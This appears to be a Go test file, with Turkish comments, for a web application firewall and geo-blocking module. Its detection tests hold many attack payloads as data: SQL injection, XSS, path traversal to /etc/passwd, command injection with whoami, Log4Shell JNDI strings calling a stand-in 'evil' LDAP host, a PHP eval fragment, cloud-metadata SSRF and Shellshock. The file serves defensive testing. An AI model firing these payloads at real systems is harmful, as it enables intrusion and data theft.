package tunsec

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

type fakeGeo map[string]string

func (f fakeGeo) Country(ip string) (string, bool) {
	c, ok := f[ip]
	return c, ok
}

func wafCfg(mode string) *Compiled {
	return Compile(Config{WAF: WAFConfig{Mode: mode}})
}

func get(target string, hdr ...string) *http.Request {
	r := httptest.NewRequest(http.MethodGet, target, nil)
	for i := 0; i+1 < len(hdr); i += 2 {
		r.Header.Set(hdr[i], hdr[i+1])
	}
	return r
}

func TestNormalizeValidation(t *testing.T) {
	if _, err := Normalize(Config{WAF: WAFConfig{Mode: "bogus"}}); err == nil {
		t.Fatal("gecersiz waf modu kabul edildi")
	}
	if _, err := Normalize(Config{Geo: GeoConfig{Mode: "allow"}}); err == nil {
		t.Fatal("bos allow listesi kabul edildi")
	}
	if _, err := Normalize(Config{Geo: GeoConfig{Mode: "deny", Countries: []string{"TURKEY"}}}); err == nil {
		t.Fatal("gecersiz ulke kodu kabul edildi")
	}
	if _, err := Normalize(Config{WAF: WAFConfig{Mode: "log", DisabledRules: []string{"nope"}}}); err == nil {
		t.Fatal("bilinmeyen kural kabul edildi")
	}
	n, err := Normalize(Config{Geo: GeoConfig{Mode: "DENY", Countries: []string{"tr", " us ", "TR"}}})
	if err != nil {
		t.Fatal(err)
	}
	if n.Geo.Mode != GeoDeny || len(n.Geo.Countries) != 2 || n.Geo.Countries[0] != "TR" || n.Geo.UnknownIs != "allow" {
		t.Fatalf("kanonik hal yanlis: %+v", n)
	}
	if Compile(Config{}) != nil {
		t.Fatal("tum kapali ayar nil derlenmeli")
	}
	if Parse([]byte("{bozuk")).WAF.Mode != "" {
		t.Fatal("bozuk JSON kapali sayilmali")
	}
}

func TestGeoDecisions(t *testing.T) {
	res := fakeGeo{"1.1.1.1": "AU", "2.2.2.2": "TR"}
	allow := Compile(Config{Geo: GeoConfig{Mode: "allow", Countries: []string{"TR"}}})
	if ok, cc := allow.GeoCheck(res, "2.2.2.2"); !ok || cc != "TR" {
		t.Fatalf("TR izinli olmali: %v %s", ok, cc)
	}
	if ok, _ := allow.GeoCheck(res, "1.1.1.1"); ok {
		t.Fatal("AU allow-listede degil, reddedilmeli")
	}
	// bilinmeyen: vars. allow
	if ok, cc := allow.GeoCheck(res, "9.9.9.9"); !ok || cc != UnknownCountry {
		t.Fatalf("unknown_is=allow: %v %s", ok, cc)
	}
	strict := Compile(Config{Geo: GeoConfig{Mode: "allow", Countries: []string{"TR"}, UnknownIs: "deny"}})
	if ok, _ := strict.GeoCheck(res, "9.9.9.9"); ok {
		t.Fatal("unknown_is=deny reddetmeli")
	}
	if ok, _ := strict.GeoCheck(nil, "2.2.2.2"); ok {
		t.Fatal("cozucu yokken (unknown) deny olmali")
	}
	deny := Compile(Config{Geo: GeoConfig{Mode: "deny", Countries: []string{"AU"}}})
	if ok, _ := deny.GeoCheck(res, "1.1.1.1"); ok {
		t.Fatal("AU reddedilmeli")
	}
	if ok, _ := deny.GeoCheck(res, "2.2.2.2"); !ok {
		t.Fatal("TR izinli olmali")
	}
	var nilc *Compiled
	if ok, _ := nilc.GeoCheck(res, "1.1.1.1"); !ok {
		t.Fatal("nil ayar her seye izin verir")
	}
}

func TestWAFPositives(t *testing.T) {
	c := wafCfg("block")
	cases := []struct{ name, target, rule string }{
		{"union", "/p?id=1+UNION+SELECT+username,password+FROM+users", "sqli-union"},
		{"union comment", "/p?id=1/**/union/**/select/**/1", "sqli-union"},
		{"tautology", "/login?u=admin%27+or+%271%27%3D%271", "sqli-tautology"},
		{"num tautology", "/p?id=1+or+1=1", "sqli-tautology"},
		{"stacked", "/p?id=1;DROP+TABLE+users", "sqli-stacked"},
		{"comment", "/p?u=admin%27--", "sqli-comment"},
		{"sleep", "/p?id=1+and+sleep(5)", "sqli-time"},
		{"infoschema", "/p?t=information_schema.tables", "sqli-meta"},
		{"xss script", "/s?q=%3Cscript%3Ealert(1)%3C/script%3E", "xss-script"},
		{"xss handler", "/s?q=%3Cimg+src=x+onerror=alert(1)%3E", "xss-handler"},
		{"xss jsuri", "/s?next=javascript:alert(1)", "xss-jsuri"},
		{"xss iframe", "/s?q=%3Ciframe+src=//evil%3E", "xss-embed"},
		{"double enc", "/s?q=%253Cscript%253E", "xss-script"},
		{"traversal", "/f?name=../../etc/passwd", "traversal-dotdot"},
		{"traversal enc", "/f?name=..%2f..%2fetc%2fpasswd", "traversal-dotdot"},
		{"traversal dbl", "/f?name=%252e%252e%252fsecret", "traversal-overlong"},
		{"etc passwd", "/f?name=/etc/passwd", "traversal-files"},
		{"git probe", "/.git/config", "probe-paths"},
		{"env probe", "/.env", "probe-paths"},
		{"cmdi", "/p?host=127.0.0.1;cat+/tmp/x", "cmdi-chain"},
		{"cmdi whoami", "/p?host=a|whoami", "cmdi-chain"},
		{"cmdi subst", "/p?x=$(whoami)", "cmdi-subst"},
		{"log4shell q", "/p?x=${jndi:ldap://evil/a}", "log4shell"},
		{"log4shell enc", "/p?x=%24%7Bjndi:ldap://evil/a%7D", "log4shell"},
		{"log4shell obf", "/p?x=${${lower:j}ndi:ldap://e/a}", "log4shell"},
		{"php wrapper", "/p?page=php://filter/convert.base64-encode/resource=index", "php-wrapper"},
		{"php eval", "/p?c=eval(base64_decode($_POST[x]))", "php-eval"},
		{"ssrf", "/p?url=http://169.254.169.254/latest/meta-data/", "ssrf-metadata"},
		{"spring4shell", "/p?class.module.classLoader.resources=1", "java-classloader"},
		{"null byte", "/f?name=a%00.png", "protocol-nullbyte"},
	}
	for _, tc := range cases {
		h, ok := c.ScanRequest(get(tc.target))
		if !ok {
			t.Errorf("%s: eslesme beklendi (%s)", tc.name, tc.target)
			continue
		}
		if h.Rule != tc.rule {
			t.Errorf("%s: kural %q, beklenen %q", tc.name, h.Rule, tc.rule)
		}
	}
}

func TestWAFHeaders(t *testing.T) {
	c := wafCfg("block")
	if h, ok := c.ScanRequest(get("/", "User-Agent", "sqlmap/1.7")); !ok || h.Rule != "scanner-ua" {
		t.Fatalf("sqlmap UA: %v %v", h, ok)
	}
	if h, ok := c.ScanRequest(get("/", "X-Api-Version", "${jndi:ldap://x/a}")); !ok || h.Rule != "log4shell" {
		t.Fatalf("log4shell baslik: %v %v", h, ok)
	}
	if h, ok := c.ScanRequest(get("/", "User-Agent", "() { :;}; /bin/bash -c 'id'")); !ok || h.Rule != "shellshock" {
		t.Fatalf("shellshock: %v %v", h, ok)
	}
	// Authorization belirteci taranmaz.
	if _, ok := c.ScanRequest(get("/", "Authorization", "Bearer ${jndi:x}")); ok {
		t.Fatal("Authorization taranmamali")
	}
}

func TestWAFFalsePositives(t *testing.T) {
	c := wafCfg("block")
	benign := []string{
		"/",
		"/api/v1/users?page=2&limit=20&sort=created_at.desc",
		"/rest/v1/items?select=name,price&order=id.desc", // PostgREST
		"/search?q=select+the+best+union+of+both+worlds", // union + select ama sorgu degil
		"/search?q=javascript:+the+good+parts",           // "javascript:" ama cagri degil
		"/search?q=O%27Brien+and+Sons",                   // kesme isareti
		"/search?q=rock%27n%27roll",                      // kesme isareti
		"/docs?title=How+to+use+%60git+status%60",        // markdown geri tirnak
		"/search?q=a...b",                                // uc nokta
		"/files/report..v2.pdf",                          // iki nokta ama gezinme degil
		"/repo.git/info/refs",                            // git smart http
		"/cb?code=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk",
		"/img?data=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg%3D%3D",
		"/p?price=5+%24&cur=TRY",
		"/p?email=user%2Btag%40example.com",
		"/p?redirect=%2Fdashboard%3Ftab%3D1",
		"/p?q=ls+-la+komutu+nedir", // komut adi ama zincir yok
		"/p?q=cat+food",
		"/p?q=sleep+tracker",
		"/p?q=drop+table+tennis", // ";" yok
		"/p?q=script+writing",
		"/p?q=1+or+2+items",
	}
	for _, target := range benign {
		if h, ok := c.ScanRequest(get(target, "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
			"Cookie", "session=abc123; theme=dark; token=eyJhbGciOiJIUzI1NiJ9.e30.x", "Referer", "https://example.com/page?x=1")); ok {
			t.Errorf("yanlis pozitif: %s -> %s", target, h.Rule)
		}
	}
}

func TestWAFDisabledRules(t *testing.T) {
	c := Compile(Config{WAF: WAFConfig{Mode: "block", DisabledRules: []string{"probe", "sqli-union"}}})
	if _, ok := c.ScanRequest(get("/.env")); ok {
		t.Fatal("probe kategorisi kapali")
	}
	if _, ok := c.ScanRequest(get("/p?id=1+union+select+1")); ok {
		t.Fatal("sqli-union kapali")
	}
	if _, ok := c.ScanRequest(get("/s?q=<script>")); !ok {
		t.Fatal("xss hala acik olmali")
	}
}

func TestWAFOff(t *testing.T) {
	var nilc *Compiled
	if _, ok := nilc.ScanRequest(get("/.env")); ok {
		t.Fatal("nil ayar taramaz")
	}
	g := Compile(Config{Geo: GeoConfig{Mode: "deny", Countries: []string{"AU"}}})
	if _, ok := g.ScanRequest(get("/.env")); ok {
		t.Fatal("waf kapaliyken taranmaz")
	}
}

func TestWAFOversize(t *testing.T) {
	c := wafCfg("block")
	h, ok := c.ScanRequest(get("/p?x=" + strings.Repeat("a", FieldHardLimit+10)))
	if !ok || h.Rule != "oversize-field" {
		t.Fatalf("oversize: %v %v", h, ok)
	}
}

func postReq(ct, body string) *http.Request {
	r := httptest.NewRequest(http.MethodPost, "/submit", strings.NewReader(body))
	r.Header.Set("Content-Type", ct)
	return r
}

func TestWAFBody(t *testing.T) {
	off := Compile(Config{WAF: WAFConfig{Mode: "block"}})
	r := postReq("application/x-www-form-urlencoded", "q=1+union+select+1")
	if _, ok := off.ScanBody(r); ok {
		t.Fatal("body kapaliyken govde taranmamali")
	}
	on := Compile(Config{WAF: WAFConfig{Mode: "block", Body: true}})
	r = postReq("application/x-www-form-urlencoded", "q=1+union+select+1&b=2")
	h, ok := on.ScanBody(r)
	if !ok || h.Rule != "sqli-union" {
		t.Fatalf("form govdesi: %v %v", h, ok)
	}
	// govde geri okunabilir kalmali
	rest, _ := io.ReadAll(r.Body)
	if string(rest) != "q=1+union+select+1&b=2" {
		t.Fatalf("govde bozuldu: %q", rest)
	}
	// normal JSON, base64, markdown engellenmez
	for _, tc := range []struct{ ct, body string }{
		{"application/json", `{"name":"O'Brien","note":"select the union of both","tags":["a","b"],"n":1}`},
		{"application/json", `{"avatar":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ+/AADUlEQVR42mNkYPhfDwAChwGA60e6kg==","ok":true}`},
		{"text/plain", "# Baslik\n\nBu bir **markdown** metni.\n\n```js\nconsole.log('merhaba')\n```\n- madde 1\n- madde 2 -- aciklama\n"},
		{"application/json", `{"q":"drop table tennis","expr":"a || b","sql":"ok"}`},
	} {
		r := postReq(tc.ct, tc.body)
		if h, ok := on.ScanBody(r); ok {
			t.Errorf("yanlis pozitif govde %q -> %s", tc.body, h.Rule)
		}
	}
	// JSON govdesinde saldiri
	if h, ok := on.ScanBody(postReq("application/json", `{"q":"${jndi:ldap://x/a}"}`)); !ok || h.Rule != "log4shell" {
		t.Fatalf("json log4shell: %v %v", h, ok)
	}
	// multipart / ikili taranmaz
	if _, ok := on.ScanBody(postReq("multipart/form-data; boundary=x", "<script>")); ok {
		t.Fatal("multipart taranmamali")
	}
	// 8 KB siniri: saldiri sinirin otesindeyse taranmaz ama govde tam kalir
	big := strings.Repeat("a", BodyScanLimit+100) + "<script>"
	r = postReq("text/plain", big)
	if _, ok := on.ScanBody(r); ok {
		t.Fatal("8 KB otesi taranmamali")
	}
	all, _ := io.ReadAll(r.Body)
	if string(all) != big {
		t.Fatal("buyuk govde bozuldu")
	}
}

func TestRulesListed(t *testing.T) {
	cats := map[string]bool{}
	for _, r := range Rules() {
		cats[r.Category] = true
	}
	for _, want := range []string{CatSQLi, CatXSS, CatTraversal, CatCmdi, CatLog4Shell, CatPHP, CatScanner} {
		if !cats[want] {
			t.Errorf("kategori eksik: %s", want)
		}
	}
}

func BenchmarkScanRequestBenign(b *testing.B) {
	c := wafCfg("block")
	r := get("/api/v1/users/42/orders?page=2&limit=20&sort=created_at.desc&status=open",
		"User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
		"Cookie", "session=abc123def456; theme=dark", "Referer", "https://example.com/dashboard",
		"Accept", "application/json", "Accept-Language", "tr-TR,tr;q=0.9,en;q=0.8", "Accept-Encoding", "gzip, br")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, ok := c.ScanRequest(r); ok {
			b.Fatal("yanlis pozitif")
		}
	}
}

func BenchmarkScanRequestAttack(b *testing.B) {
	c := wafCfg("block")
	r := get("/p?id=1+union+select+username,password+from+users")
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		if _, ok := c.ScanRequest(r); !ok {
			b.Fatal("saldiri kacti")
		}
	}
}

func BenchmarkGeoCheck(b *testing.B) {
	c := Compile(Config{Geo: GeoConfig{Mode: "deny", Countries: []string{"AU", "CN", "RU"}}})
	res := fakeGeo{"2.2.2.2": "TR"}
	for i := 0; i < b.N; i++ {
		c.GeoCheck(res, "2.2.2.2")
	}
}
